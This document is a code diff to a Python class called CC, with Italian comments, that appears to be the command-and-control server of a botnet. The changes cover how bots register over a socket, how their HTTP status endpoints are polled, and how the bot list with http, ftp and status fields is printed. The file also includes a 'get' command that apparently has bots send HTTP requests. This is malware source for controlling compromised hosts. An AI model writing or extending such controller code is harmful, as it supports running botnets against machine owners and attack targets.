@@ -18,11 +18,11 @@ class CC:
         self.loadData()
 
     # aggiunge un bot alle liste
-    def addBot(self, ip, portList, status):
+    def addBot(self, ip, data):
         while (not self.activeBotSf):
             continue
         self.activeBotSf = False
-        self.activeBot[ip] = [portList, status]
+        self.activeBot[ip] = json.loads(data)
         self.activeBotSf = True
         return True
 
@@ -40,7 +40,7 @@ class CC:
                     conn, addr = s.accept()
                     data = conn.recv(1024).decode()
                     data = data.split(" ")
-                    res = self.addBot(data[0], data[1].strip('][').split(','), 'waiting')
+                    res = self.addBot(data[0], data[1])
                     if res:
                         data = "bot registrated succesfully"
                         conn.send(data.encode())
@@ -48,7 +48,7 @@ class CC:
                         data = "bot not registrated"
                         conn.send(data.encode())
                     conn.close()
-                except:
+                except Exception as e:
                     continue
         except Exception as e:
             print("\nListening errors:", e)
@@ -62,39 +62,19 @@ class CC:
         if target == "":
             rm = []
             for k, v in self.activeBot.items():
-                reachable = len(v[0])
-                newPorts = []
-                for i in v[0]:
-                    try:
-                        url = "http://" + k + ":" + i + "/status"
-                        response = requests.get(url)
-                        res = response.json()
-                        self.activeBot[k] = [v[0], res["status"]]
-                        newPorts.append(i)
-                    except:
-                        reachable -= 1
-                if reachable == 0:
-                    rm.append(k)
-                else:
-                    self.activeBot[k] = [newPorts, "waiting"]
-            [self.activeBot.pop(r) for r in rm]
-        else:
-            port = self.activeBot[target][0]
-            reachable = len(port)
-            newPorts = []
-            for i in port:
                 try:
-                    url = "http://" + target + ":" + port[0] + "/status"
+                    url = "http://" + k + ":" + str(v['http']) + "/status"
                     response = requests.get(url)
                     res = response.json()
-                    self.activeBot[target] = [port, res["status"]]
-                    newPorts.append(i)
-                except:
-                    reachable -= 1
-            if reachable == 0:
-                self.activeBot.pop(target)
-            else:
-                self.activeBot[target] = [newPorts, "waiting"]
+                except Exception as e:
+                    print(k, " is not reachable over http port: ", e)
+        else:
+            try:
+                url = "http://" + target + ":" + str(self.activeBot[target]['http']) + "/status"
+                response = requests.get(url)
+                res = response.json()
+            except Exception as e:
+                print(target, " is not reachable over http port: ", e)
         print("Controllo terminato")
 
     def makeHTTPRequest(self, server, target=""):
@@ -127,13 +107,13 @@ class CC:
                 event.set()
                 return
             if comando == "ls":
-                print("Ip\t\tPorts")
+                print("Ip\t\thttp\t\tftp")
                 for k, v in self.activeBot.items():
-                    print(f"{k}\t{v[0]}")
+                    print(f"{k}\t{v['http']}\t\t{v['ftp']}")
             if comando == "ls -s":
-                print("Ip\t\tPorts\t\tStatus")
+                print("Ip\t\thttp\t\tftp\t\tstatus")
                 for k, v in self.activeBot.items():
-                    print(f"{k}\t{v[0]}\t\t{v[1]}")
+                    print(f"{k}\t{v['http']}\t\t{v['ftp']}\t\t{v['status']}")
             if comando.startswith("get"):
                 c = comando.split(" ")
                 if len(c) == 1 or len(c) == 2:
